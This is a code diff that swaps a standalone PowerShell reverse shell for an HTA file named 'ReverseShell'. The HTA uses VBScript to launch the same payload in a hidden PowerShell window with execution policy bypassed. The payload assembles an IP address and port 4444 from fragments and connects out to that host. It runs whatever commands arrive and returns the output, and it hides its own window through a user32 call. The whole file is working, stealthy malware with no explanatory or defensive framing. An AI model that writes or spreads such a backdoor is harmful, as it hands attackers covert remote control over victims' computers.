@@ -1,103 +1,14 @@
-function X1Z {
-    param([string]$p7q)
-    if ($p7q -eq "..") {
-        $r9t = (Resolve-Path $p7q -ErrorAction SilentlyContinue).Path
-    }
-    elseif ($p7q.StartsWith('"')) {
-        $q8w = $p7q.Substring(1, $p7q.Length - 2)
-        $r9t = (Resolve-Path $q8w -ErrorAction SilentlyContinue).Path
-        if (-not $r9t) { return $false }
-    }
-    else {
-        $r9t = (Resolve-Path $p7q -ErrorAction SilentlyContinue).Path
-        if (-not $r9t) { return $false }
-    }
-    try {
-        Set-Location $r9t -ErrorAction Stop
-        return $true
-    }
-    catch {
-        return $false
-    }
-}
-
-function Y2K {
-    return (Get-Location).Path + ">"
-}
-
-function Z3M {
-    param([string]$e4r)
-    Write-Error "Hata: $e4r (Kod: $LASTEXITCODE)"
-    exit 1
-}
-
-function W4N {
-    param([string]$c5v)
-    if ($c5v.StartsWith("cd")) {
-        $n6x = ""
-        if ($c5v.Length -gt 3) {
-            $n6x = $c5v.Substring(3).Trim()
-        }
-        else {
-            return Y2K
-        }
-        if (X1Z -p7q $n6x) {
-            return Y2K
-        }
-        else {
-            return "Dizin degistirilemedi.`n" + (Y2K)
-        }
-    }
-    try {
-        $r7t = & powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "& { $c5v }" 2>&1 | Out-String
-    }
-    catch {
-        return "Islem basarisiz.`n" + (Y2K)
-    }
-    if ([string]::IsNullOrEmpty($r7t)) {
-        $r7t = "Komut calisti.`n"
-    }
-    return $r7t + (Y2K)
-}
-
-function Q8P {
-    $a1b = "172."
-    $b2c = "22."
-    $c3d = "164."
-    $d4e = "211"
-    $p5f = 44
-    $p6g = 44
-    $i7h = $a1b + $b2c + $c3d + $d4e
-    $p8i = $p5f * 100 + $p6g
-    try {
-        $k9j = New-Object System.Net.Sockets.TcpClient($i7h, $p8i)
-    }
-    catch {
-        Z3M "Baglanti basarisiz."
-    }
-    $s1k = $k9j.GetStream()
-    $m2n = Y2K
-    $b3y = [System.Text.Encoding]::ASCII.GetBytes($m2n)
-    $s1k.Write($b3y, 0, $b3y.Length)
-    $f4z = New-Object byte[] 4096
-    while ($true) {
-        try {
-            $r5x = $s1k.Read($f4z, 0, 4096)
-            if ($r5x -le 0) { break }
-            $c6w = [System.Text.Encoding]::ASCII.GetString($f4z, 0, $r5x).Trim()
-            $r7v = W4N -c5v $c6w
-            $b8u = [System.Text.Encoding]::ASCII.GetBytes($r7v)
-            $s1k.Write($b8u, 0, $b8u.Length)
-        }
-        catch {
-            break
-        }
-    }
-    $k9j.Close()
-}
-
-Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int s);' -Name X9Y -Namespace Z8W
-$h1q = (Get-Process -id $pid).MainWindowHandle
-[Z8W.X9Y]::ShowWindow($h1q, 0) | Out-Null
-Start-Sleep -Milliseconds 1000
-Q8P
+<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="ReverseShell" BORDER="none" BORDERSTYLE="normal" CAPTION="no" INNERBORDER="no" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no" SCROLL="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" VERSION="1.0" WINDOWSTATE="minimize" />
+<script language="VBScript">
+  Dim shell
+  Set shell = CreateObject("WScript.Shell")
+  shell.Run "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { " & vbCrLf & _
+  "function X1Z {param([string]$p7q);if ($p7q -eq "".."") {$r9t = (Resolve-Path $p7q -ErrorAction SilentlyContinue).Path} elseif ($p7q.StartsWith('""')) {$q8w = $p7q.Substring(1, $p7q.Length - 2);$r9t = (Resolve-Path $q8w -ErrorAction SilentlyContinue).Path;if (-not $r9t) {return $false}} else {$r9t = (Resolve-Path $p7q -ErrorAction SilentlyContinue).Path;if (-not $r9t) {return $false}};try {Set-Location $r9t -ErrorAction Stop;return $true}catch {return $false}}" & vbCrLf & _
+  "function Y2K {return (Get-Location).Path + "">""}" & vbCrLf & _
+  "function Z3M {param([string]$e4r);Write-Error ""Hata: $e4r (Kod: $LASTEXITCODE)"";exit 1}" & vbCrLf & _
+  "function W4N {param([string]$c5v);if ($c5v.StartsWith(""cd"")) {$n6x = """";if ($c5v.Length -gt 3) {$n6x = $c5v.Substring(3).Trim()} else {return Y2K};if (X1Z -p7q $n6x) {return Y2K} else {return ""Dizin degistirilemedi.`n"" + (Y2K)}};try {$r7t = & powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ""& { $c5v }"" 2>&1 | Out-String}catch {return ""Islem basarisiz.`n"" + (Y2K)};if ([string]::IsNullOrEmpty($r7t)) {$r7t = ""Komut calisti.`n""};return $r7t + (Y2K)}" & vbCrLf & _
+  "function Q8P {$a1b = ""172."";$b2c = ""22."";$c3d = ""164."";$d4e = ""211"";$p5f = 44;$p6g = 44;$i7h = $a1b + $b2c + $c3d + $d4e;$p8i = $p5f * 100 + $p6g;try {$k9j = New-Object System.Net.Sockets.TcpClient($i7h, $p8i)}catch {Z3M ""Baglanti basarisiz.""};$s1k = $k9j.GetStream();$m2n = Y2K;$b3y = [System.Text.Encoding]::ASCII.GetBytes($m2n);$s1k.Write($b3y, 0, $b3y.Length);$f4z = New-Object byte[] 4096;while ($true) {try {$r5x = $s1k.Read($f4z, 0, 4096);if ($r5x -le 0) {break};$c6w = [System.Text.Encoding]::ASCII.GetString($f4z, 0, $r5x).Trim();$r7v = W4N -c5v $c6w;$b8u = [System.Text.Encoding]::ASCII.GetBytes($r7v);$s1k.Write($b8u, 0, $b8u.Length)}catch {break}};$k9j.Close()}" & vbCrLf & _
+  "Add-Type -MemberDefinition '[DllImport(""user32.dll"")] public static extern bool ShowWindow(IntPtr h, int s);' -Name X9Y -Namespace Z8W;$h1q = (Get-Process -id $pid).MainWindowHandle;[Z8W.X9Y]::ShowWindow($h1q, 0) | Out-Null;Start-Sleep -Milliseconds 1000;Q8P" & vbCrLf & _
+  " }""", 0, True
+  window.Close
+</script>
